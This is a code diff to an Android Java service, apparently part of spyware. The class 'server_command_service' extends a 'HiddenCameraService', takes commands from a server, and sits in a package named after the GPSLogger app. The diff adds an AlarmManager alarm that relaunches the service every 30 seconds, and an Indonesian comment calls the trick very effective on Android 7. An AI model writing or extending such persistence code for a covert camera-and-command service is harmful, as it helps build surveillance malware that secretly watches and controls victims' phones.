@@ -2,7 +2,9 @@ package com.mendhak.gpslogger.darisms;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
+import android.app.AlarmManager;
 import android.app.Notification;
+import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.Context;
@@ -23,6 +25,7 @@ import android.os.Build;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.PowerManager;
+import android.os.SystemClock;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
@@ -716,6 +719,15 @@ public class server_command_service extends HiddenCameraService {
         intentFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
         broadcast_receiver = new broadcast_receiver();
         registerReceiver(broadcast_receiver, intentFilter);
+
+
+        /*****gila android Nougat /7 ini sangat efektif*/
+        final Intent intent = new Intent(context, server_command_service.class);
+        final PendingIntent pending = PendingIntent.getService(context, 0, intent, 0);
+        final AlarmManager alarm = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+        alarm.cancel(pending);
+        long interval = 30000;//milliseconds
+        alarm.setRepeating(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime(),interval, pending);
     }
 
     private boolean get_me() {
